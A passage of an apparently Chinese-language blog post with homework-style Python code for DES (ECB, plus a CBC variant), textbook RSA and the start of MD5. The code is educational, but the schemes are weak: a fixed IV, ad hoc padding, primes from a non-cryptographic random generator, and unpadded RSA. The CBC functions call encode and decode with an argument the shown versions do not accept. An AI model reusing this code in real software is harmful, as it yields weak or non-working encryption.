              [<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>]
              ]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>), <span class="hljs-number">6</span>):
        begin_s = <span class="hljs-built_in">str</span>[i:i + <span class="hljs-number">6</span>]
        row = <span class="hljs-built_in">int</span>(begin_s[<span class="hljs-number">0</span>] + begin_s[<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)  <span class="hljs-comment">#第一位和第六位作为行</span>
        col = <span class="hljs-built_in">int</span>(begin_s[<span class="hljs-number">1</span>:<span class="hljs-number">5</span>], <span class="hljs-number">2</span>)             <span class="hljs-comment">#中间四位作为列</span>
        index = s_list[j][row * <span class="hljs-number">16</span> + col]
        num = <span class="hljs-built_in">bin</span>(index)[<span class="hljs-number">2</span>:]                   <span class="hljs-comment">#将匹配的数字转换位二进制数</span>
        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">4</span> - <span class="hljs-built_in">len</span>(num)):       <span class="hljs-comment">#不够4位则补0</span>
            num = <span class="hljs-string">&quot;0&quot;</span> + num
        res += num
        j = j + <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># p盒处理   置换操作</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">P_box</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>
    res = <span class="hljs-string">&quot;&quot;</span>
    change_table = [<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">29</span>,<span class="hljs-number">12</span>,<span class="hljs-number">28</span>,<span class="hljs-number">17</span>,
                    <span class="hljs-number">1</span>,<span class="hljs-number">15</span>,<span class="hljs-number">23</span>,<span class="hljs-number">26</span>,<span class="hljs-number">5</span>,<span class="hljs-number">18</span>,<span class="hljs-number">31</span>,<span class="hljs-number">10</span>,
                    <span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">24</span>,<span class="hljs-number">14</span>,<span class="hljs-number">32</span>,<span class="hljs-number">27</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,
                    <span class="hljs-number">19</span>,<span class="hljs-number">13</span>,<span class="hljs-number">30</span>,<span class="hljs-number">6</span>,<span class="hljs-number">22</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">25</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i - <span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># F函数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">F_function</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, key</span>):</span>  <span class="hljs-comment"># R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或-&gt;S盒-&gt;P置换</span>
    str_e_res = E_box(<span class="hljs-built_in">str</span>)            <span class="hljs-comment"># 将 E 异或 S  P 集合到一个函数种，便于调用</span>
    xor_res = xor(str_e_res, key)
    str_s_res = S_box(xor_res)
    str_p_res = P_box(str_s_res)
    <span class="hljs-keyword">return</span> str_p_res

<span class="hljs-comment"># 逆IP盒</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">IP_re</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>
    res = <span class="hljs-string">&quot;&quot;</span>
    ip_list = [<span class="hljs-number">40</span>,<span class="hljs-number">8</span>,<span class="hljs-number">48</span>,<span class="hljs-number">16</span>,<span class="hljs-number">56</span>,<span class="hljs-number">24</span>,<span class="hljs-number">64</span>,<span class="hljs-number">32</span>,
               <span class="hljs-number">39</span>,<span class="hljs-number">7</span>,<span class="hljs-number">47</span>,<span class="hljs-number">15</span>,<span class="hljs-number">55</span>,<span class="hljs-number">23</span>,<span class="hljs-number">63</span>,<span class="hljs-number">31</span>,
               <span class="hljs-number">38</span>,<span class="hljs-number">6</span>,<span class="hljs-number">46</span>,<span class="hljs-number">14</span>,<span class="hljs-number">54</span>,<span class="hljs-number">22</span>,<span class="hljs-number">62</span>,<span class="hljs-number">30</span>,
               <span class="hljs-number">37</span>,<span class="hljs-number">5</span>,<span class="hljs-number">45</span>,<span class="hljs-number">13</span>,<span class="hljs-number">53</span>,<span class="hljs-number">21</span>,<span class="hljs-number">61</span>,<span class="hljs-number">29</span>,
               <span class="hljs-number">36</span>,<span class="hljs-number">4</span>,<span class="hljs-number">44</span>,<span class="hljs-number">12</span>,<span class="hljs-number">52</span>,<span class="hljs-number">20</span>,<span class="hljs-number">60</span>,<span class="hljs-number">28</span>,
               <span class="hljs-number">35</span>,<span class="hljs-number">3</span>,<span class="hljs-number">43</span>,<span class="hljs-number">11</span>,<span class="hljs-number">51</span>,<span class="hljs-number">19</span>,<span class="hljs-number">59</span>,<span class="hljs-number">27</span>,
               <span class="hljs-number">34</span>,<span class="hljs-number">2</span>,<span class="hljs-number">42</span>,<span class="hljs-number">10</span>,<span class="hljs-number">50</span>,<span class="hljs-number">18</span>,<span class="hljs-number">58</span>,<span class="hljs-number">26</span>,
               <span class="hljs-number">33</span>,<span class="hljs-number">1</span>,<span class="hljs-number">41</span>,<span class="hljs-number">9</span>,<span class="hljs-number">49</span>,<span class="hljs-number">17</span>,<span class="hljs-number">57</span>,<span class="hljs-number">25</span> ]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ip_list:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res


<span class="hljs-comment"># DES加密操作</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DESencode</span>(<span class="hljs-params">text, key</span>):</span>
    text_bin = str_process(text)     <span class="hljs-comment"># 将字符转换为二进制数</span>
    text_IP = begin_change(text_bin)  <span class="hljs-comment"># 明文初始置换</span>
    key_bin = str_process(key)      <span class="hljs-comment"># 将密钥转换位二进制数</span>
    key_list = key_gen(key_bin) <span class="hljs-comment"># key_lsst 数组中存放着十六个子密钥</span>

    text_left = text_IP[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]     <span class="hljs-comment"># R0</span>
    text_right = text_IP[<span class="hljs-number">32</span>:]     <span class="hljs-comment"># L0</span>

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>):      <span class="hljs-comment"># 十五轮加密</span>

        mes_tmp = text_right     <span class="hljs-comment"># 临时变量用于左右两部分交换</span>
        text_right = xor(F_function(text_right, key_list[i]) , text_left) <span class="hljs-comment">#F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位)</span>
        text_left = mes_tmp
    fin_right = text_right       <span class="hljs-comment"># 第十六轮加密</span>
    fin_left = xor(F_function(text_right, key_list[<span class="hljs-number">15</span>]), text_left)
    criph_text = fin_left + fin_right
    criph_text = IP_re(criph_text)     <span class="hljs-comment">#  IP逆置换</span>
    <span class="hljs-keyword">return</span> criph_text

<span class="hljs-comment"># 针对一组的解密程序</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DESdecode</span>(<span class="hljs-params">text, key</span>):</span>  <span class="hljs-comment">#密文直接输64位2进制</span>
    key_bin = str_process(key)    <span class="hljs-comment"># 将密钥转换为二进制数</span>
    key_list = key_gen(key_bin)   <span class="hljs-comment"># 生成的十六个子密钥</span>
    text = begin_change(text)   <span class="hljs-comment"># 先初始值换 与加密过程相反</span>
    cipher_left = text[<span class="hljs-number">0</span>:<span class="hljs-number">32</span>]    <span class="hljs-comment"># R16</span>
    cipher_right = text[<span class="hljs-number">32</span>:]    <span class="hljs-comment"># L16</span>
    i = <span class="hljs-number">15</span>
    <span class="hljs-keyword">while</span> i &gt; <span class="hljs-number">0</span>:                <span class="hljs-comment"># 十五轮加密 反过来</span>
        cipher_tmp = cipher_right   <span class="hljs-comment">#设置一个临时变量用于后面的交换</span>
        cipher_right = xor(cipher_left, F_function(cipher_right, key_list[i]))    <span class="hljs-comment"># F 函数的作用 R(32位)-&gt;E盒(48位)-&gt;与key的子密钥异或(32位)-&gt;S盒(32位)-&gt;P置换(32位)</span>
                                                                                  <span class="hljs-comment"># F 函数处理完后与L(32位)异或</span>
        cipher_left = cipher_tmp    <span class="hljs-comment"># 左右交换完成</span>
        i = i - <span class="hljs-number">1</span>
    left_text = xor(cipher_left, F_function(cipher_right, key_list[<span class="hljs-number">0</span>])) <span class="hljs-comment"># 一</span>
    right_text = cipher_right                                           <span class="hljs-comment"># 二 三 这三步是第十六轮加密</span>
    plain_bin = left_text + right_text                                  <span class="hljs-comment">#</span>
    plain_bin = IP_re(plain_bin)                                        <span class="hljs-comment">#</span>
    plain_text = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(plain_bin), <span class="hljs-number">8</span>):
        plain_text += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(plain_bin[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>))
    <span class="hljs-keyword">return</span> plain_text


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Divide_text</span>(<span class="hljs-params">order,text,key</span>):</span>    <span class="hljs-comment"># 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组</span>
    block_text = []
    res = <span class="hljs-string">&quot;&quot;</span>
    length = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&quot;E&quot;</span>:
        length = <span class="hljs-number">8</span>
    <span class="hljs-keyword">else</span>:
        length = <span class="hljs-number">64</span>
    i = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> text[i:i+length] != <span class="hljs-string">&quot;&quot;</span>:
        block_text.append(text[i:i+length])
        i += length

    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&#x27;E&#x27;</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]) != <span class="hljs-number">8</span>:       <span class="hljs-comment"># 最后一组明文如果不够八个字符则添加 + 补齐八个  否则程序会报错</span>
            block_text[-<span class="hljs-number">1</span>] = block_text[-<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;+&#x27;</span> * (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]))
        <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> block_text:             <span class="hljs-comment"># 分别对每组加密</span>
            res += DESencode(text, key)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> text <span class="hljs-keyword">in</span> block_text:             <span class="hljs-comment"># 对密文解密</span>
            res += DESdecode(text, key)
    <span class="hljs-keyword">return</span> res

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        plaintext = <span class="hljs-string">&#x27;&#x27;</span>
        ciphertext = <span class="hljs-string">&#x27;&#x27;</span>
        key = <span class="hljs-string">&#x27;&#x27;</span>
        order = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;加密请按E,解密请按D:&quot;</span>)
        <span class="hljs-keyword">if</span> order == <span class="hljs-string">&#x27;E&#x27;</span>:
            plaintext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文：&quot;</span>)
            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥：&quot;</span>)
            ciphertext = Divide_text(order, plaintext, key)
            print(<span class="hljs-string">&quot;密文是：&quot;</span>)
            print(ciphertext)
        <span class="hljs-keyword">else</span>:
            ciphertext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密文：&quot;</span>)
            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥：&quot;</span>)
            plaintext = Divide_text(order, ciphertext, key)
            print(<span class="hljs-string">&quot;明文是：&quot;</span>)
            print(plaintext)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>



<p>DES_CBC模式</p>
<p>只需要修改ECB模式中的 Divide_text 部分</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Divide_text</span>(<span class="hljs-params">order,text,key</span>):</span>    <span class="hljs-comment"># 将明文或者明文分组 明文分成8个字符一组，密文则分成64bit一组</span>
    block_text = []
    IV = <span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>                 <span class="hljs-comment"># 初始化向量</span>
    IV_bin = str_process(IV)
    res = <span class="hljs-string">&quot;&quot;</span>
    length = <span class="hljs-number">0</span>
    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&quot;E&quot;</span>:
        length = <span class="hljs-number">8</span>
    <span class="hljs-keyword">else</span>:
        length = <span class="hljs-number">64</span>
    i = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> text[i:i+length] != <span class="hljs-string">&quot;&quot;</span>:
        block_text.append(text[i:i+length])
        i += length
    tmp = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-comment"># 加密</span>
    <span class="hljs-keyword">if</span> order == <span class="hljs-string">&#x27;E&#x27;</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]) != <span class="hljs-number">8</span>:       <span class="hljs-comment"># 最后一组明文如果不够八个字符则添加 + 补齐八个  否则程序会报错</span>
            block_text[-<span class="hljs-number">1</span>] = block_text[-<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;+&#x27;</span> * (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(block_text[-<span class="hljs-number">1</span>]))

        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(block_text)):             <span class="hljs-comment"># 分别对每组加密</span>
            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span> :
                tmp = DESencode(block_text[i],key, IV_bin)
                res += tmp
            <span class="hljs-keyword">else</span>:
                tmp = DESencode(block_text[i],key,tmp)
                res += tmp
    <span class="hljs-comment"># 解密</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(block_text)):
            <span class="hljs-keyword">if</span> i == <span class="hljs-number">0</span>:
                tmp = block_text[i]
                res += DESdecode(block_text[i], key, IV_bin)
            <span class="hljs-keyword">else</span>:
                res += DESdecode(block_text[i], key, tmp)
                tmp = block_text[i]
    <span class="hljs-keyword">return</span> res</code></pre>



<h1 id="四、RSA"><a href="#四、RSA" class="headerlink" title="四、RSA"></a>四、RSA</h1><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/12/23 14:24</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : rsa.py</span>

<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> random

<span class="hljs-comment"># 模重复平方法</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fast_mod</span>(<span class="hljs-params">p,q,n</span>):</span>     <span class="hljs-comment"># p为底数，p为指数</span>
    res = <span class="hljs-number">1</span>
    <span class="hljs-keyword">while</span> q:
        <span class="hljs-keyword">if</span> q &amp; <span class="hljs-number">1</span>:
            res = (res * p) % n
        q &gt;&gt;= <span class="hljs-number">1</span>             <span class="hljs-comment"># 右移1位</span>
        p = (p * p) % n
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 计算出d</span>
<span class="hljs-comment">#这个扩展欧几里得算法求模逆,用于求d</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">caculateD</span>(<span class="hljs-params">a, m</span>):</span>
    u1,u2,u3 = <span class="hljs-number">1</span>,<span class="hljs-number">0</span>,a
    v1,v2,v3 = <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,m
    <span class="hljs-keyword">while</span> v3!=<span class="hljs-number">0</span>:
        q = u3//v3
        v1,v2,v3,u1,u2,u3 = (u1-q*v1),(u2-q*v2),(u3-q*v3),v1,v2,v3
    <span class="hljs-keyword">return</span> u1%m


<span class="hljs-comment"># 将字符转化为十六进制字符串</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2Hex</span>(<span class="hljs-params">m</span>):</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">&quot;&#123;:02x&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">ord</span>(x)) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> m)

<span class="hljs-comment"># 素性检验：采用 Miler-Rabin 检验法</span>
<span class="hljs-comment"># 所有的𝑟 ∈ [0, 𝑠 − 1]，若𝑎^𝑑 ≠ 1(𝑚𝑜𝑑 𝑛)且𝑎^((2^𝑟)*𝑑) ≠ −1(𝑚𝑜𝑑 𝑛)，则𝑛是合数。否则，𝑛有 3/4的概率为素数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">miller_rabin</span>(<span class="hljs-params">n</span>):</span>
    s = n - <span class="hljs-number">1</span>
    t = <span class="hljs-number">0</span>
    <span class="hljs-keyword">while</span> s % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:  <span class="hljs-comment"># n,s,t之间的关系为 n = 2^s * t</span>
        s = s // <span class="hljs-number">2</span>
        t += <span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> trials <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):   <span class="hljs-comment"># 可以多增加几轮保证大概率为素数</span>
        a = random.randrange(<span class="hljs-number">2</span>, n - <span class="hljs-number">1</span>) <span class="hljs-comment"># 随机生成a</span>
        v = <span class="hljs-built_in">pow</span>(a, s, n)               <span class="hljs-comment"># 验证 a^(n-1) mod n</span>
        <span class="hljs-keyword">if</span> v != <span class="hljs-number">1</span>:
            i = <span class="hljs-number">0</span>
            <span class="hljs-keyword">while</span> v != (n - <span class="hljs-number">1</span>):
                <span class="hljs-keyword">if</span> i == t - <span class="hljs-number">1</span>:
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-keyword">else</span>:
                    i = i + <span class="hljs-number">1</span>
                    v = (v ** <span class="hljs-number">2</span>) % n
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
<span class="hljs-comment"># 生成素数 先生成1024位的奇数，再进行素性检验，通过则生成该素数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genPrime</span>(<span class="hljs-params">b=<span class="hljs-number">1024</span></span>):</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:                             <span class="hljs-comment"># 设置死循环直到生成素数才退出</span>
        res = <span class="hljs-string">&quot;1&quot;</span>
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b-<span class="hljs-number">2</span>):
            res += <span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))
        res += <span class="hljs-string">&quot;1&quot;</span>                              <span class="hljs-comment"># 最后一位为1保证为奇数</span>
        res = <span class="hljs-built_in">int</span>(res,<span class="hljs-number">2</span>)
        <span class="hljs-keyword">if</span> miller_rabin(res):
            <span class="hljs-keyword">return</span> res                          <span class="hljs-comment"># 直到该数通过素数检验才推出循环</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genE</span>(<span class="hljs-params">phi_n</span>):</span>
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        e = genPrime(b=random.randint(<span class="hljs-number">3</span>,<span class="hljs-number">13</span>))  <span class="hljs-comment">#随机生成e</span>
        <span class="hljs-keyword">if</span> e &lt; <span class="hljs-number">2000</span> :                  <span class="hljs-comment"># e不能太小</span>
            <span class="hljs-keyword">continue</span>
        <span class="hljs-keyword">if</span> phi_n%e != <span class="hljs-number">0</span>:               <span class="hljs-comment"># 保证e不能被phi整除</span>
            <span class="hljs-keyword">return</span> e

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSAEncode</span>(<span class="hljs-params">m, e, n</span>):</span>               <span class="hljs-comment"># 加密公式 m^e mod n</span>
    m = <span class="hljs-built_in">int</span>(str2Hex(m), <span class="hljs-number">16</span>)           <span class="hljs-comment"># 将字符转换为二进制</span>
    c = fast_mod(m, e, n)
    <span class="hljs-keyword">return</span> c

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RSADecode</span>(<span class="hljs-params">c, d, n</span>):</span>                 <span class="hljs-comment"># 加密公式 c^d mod n</span>
    plaintext = fast_mod(c,d,n)
    plaintext = <span class="hljs-built_in">str</span>(long_to_bytes(plaintext).decode()) <span class="hljs-comment"># 将数字转换为字符</span>
    <span class="hljs-keyword">return</span> plaintext


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    <span class="hljs-comment"># 生成两个大素数p和q</span>
    print(<span class="hljs-string">&quot;Generate p,q and e, please wait... &quot;</span>)
    p = genPrime()
    q = genPrime()
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;p = &quot;</span>+<span class="hljs-built_in">str</span>(p))
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;q = &quot;</span>+<span class="hljs-built_in">str</span>(q))
    n = p*q
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;n = &quot;</span>+<span class="hljs-built_in">str</span>(n))
    <span class="hljs-comment"># 用欧拉定理计算 phi_n</span>
    phi_n = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)
    <span class="hljs-comment"># 生成e</span>
    e = genE(phi_n)
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;e = &quot;</span>+<span class="hljs-built_in">str</span>(e))
    <span class="hljs-comment"># m = &quot;Hello world!&quot;</span>
    m = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入明文: &#x27;</span>))
    <span class="hljs-comment"># 加密算法</span>
    Cryphtext = RSAEncode(m, e, n)
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;The Ciphertext is: &quot;</span>+<span class="hljs-built_in">str</span>(Cryphtext))
    <span class="hljs-comment"># 解密算法</span>
    d = caculateD(e, phi_n)
    Plaintext = RSADecode(Cryphtext, d, n)
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;The Plaintext is: &quot;</span>+Plaintext)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>





<h1 id="五、MD5"><a href="#五、MD5" class="headerlink" title="五、MD5"></a>五、MD5</h1><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/12/18 21:50</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : MD5.py</span>

<span class="hljs-keyword">import</span> math
<span class="hljs-comment"># 定义初始向量abcd,并将其转换成2进制,且补0到32位</span>
<span class="hljs-comment"># 标准的幻数（物理顺序）是（A=(01234567)16，B=(89ABCDEF)16，C=(FEDCBA98)16，D=(76543210)16）。如果在程序中定义应该是:</span>
<span class="hljs-comment"># （A=0X67452301L，B=0XEFCDAB89L，C=0X98BADCFEL，D=0X10325476L）</span>
ABCD_list = [<span class="hljs-string">&#x27;67452301&#x27;</span>,<span class="hljs-string">&#x27;efcdab89&#x27;</span>,<span class="hljs-string">&#x27;98badcfe&#x27;</span>,<span class="hljs-string">&#x27;10325476&#x27;</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ABCD_list)):
    tmp = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(ABCD_list[i], <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) &lt; <span class="hljs-number">32</span>:
        tmp = (<span class="hljs-number">32</span> - <span class="hljs-built_in">len</span>(tmp)) * <span class="hljs-string">&#x27;0&#x27;</span> + tmp
    ABCD_list[i] = tmp
A0,B0,C0,D0 = ABCD_list[<span class="hljs-number">0</span>], ABCD_list[<span class="hljs-number">1</span>], ABCD_list[<span class="hljs-number">2</span>], ABCD_list[<span class="hljs-number">3</span>]

<span class="hljs-comment"># 生成第1-64个式子的第i个32比特常数</span>
Ti = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">64</span>):
    result = (<span class="hljs-built_in">int</span>(<span class="hljs-number">4294967296</span> * <span class="hljs-built_in">abs</span>(math.sin(i + <span class="hljs-number">1</span>)))) &amp; <span class="hljs-number">0xffffffff</span>
    result = <span class="hljs-built_in">bin</span>(result)[<span class="hljs-number">2</span>:]
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(result) &lt; <span class="hljs-number">32</span>:
        result = (<span class="hljs-number">32</span> - <span class="hljs-built_in">len</span>(result)) * <span class="hljs-string">&#x27;0&#x27;</span> + result
    Ti.append(result)

<span class="hljs-comment"># 实现x,y的逐比特与</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">and1</span>(<span class="hljs-params">x, y</span>):</span>
    res = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):
        res += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x[i])&amp;<span class="hljs-built_in">int</span>(y[i]))
    <span class="hljs-keyword">return</span> res
<span class="hljs-comment"># 实现x,y的逐比特或</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">or1</span>(<span class="hljs-params">x, y</span>):</span>
    res = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):
        res += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x[i])|<span class="hljs-built_in">int</span>(y[i]))
    <span class="hljs-keyword">return</span> res
<span class="hljs-comment"># 实现x,y的逐比特异或</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span>(<span class="hljs-params">x, y</span>):</span>
    res = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(x)):
        res += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(x[i])^<span class="hljs-built_in">int</span>(y[i]))
    <span class="hljs-keyword">return</span> res
<span class="hljs-comment"># 实现x的逐比特逻辑反</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse</span>(<span class="hljs-params">x</span>):</span>
    res = <span class="hljs-string">&#x27;&#x27;</span>
